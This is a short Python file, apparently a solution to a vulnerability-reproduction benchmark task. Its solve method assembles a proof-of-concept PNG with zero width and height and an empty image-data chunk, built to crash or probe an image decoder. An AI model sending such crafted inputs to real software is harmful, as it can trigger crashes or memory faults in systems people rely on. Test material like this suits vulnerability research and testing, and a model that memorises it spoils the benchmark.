import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        sig = b'\x89PNG\r\n\x1a\n'
        length = 13
        length_b = length.to_bytes(4, 'big')
        ihdr = b'IHDR'
        width = 0
        height = 0
        bit_depth = 8
        color_type = 2  # RGB
        comp = 0
        filt = 0
        interl = 0
        data = (width.to_bytes(4, 'big') + height.to_bytes(4, 'big') +
                bytes([bit_depth, color_type, comp, filt, interl]))
        crc = zlib.crc32(ihdr + data) & 0xffffffff
        crc_b = crc.to_bytes(4, 'big')
        ihdr_chunk = length_b + ihdr + data + crc_b

        # Empty IDAT for zero-sized image
        idat_length = 0
        idat_length_b = idat_length.to_bytes(4, 'big')
        idat_type = b'IDAT'
        idat_data = b''
        idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff
        idat_crc_b = idat_crc.to_bytes(4, 'big')
        idat_chunk = idat_length_b + idat_type + idat_data + idat_crc_b

        # IEND chunk
        iend_length_b = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_crc_b = b'\xae\x42\x60\x82'
        iend_chunk = iend_length_b + iend_type + iend_crc_b

        poc = sig + ihdr_chunk + idat_chunk + iend_chunk
        return poc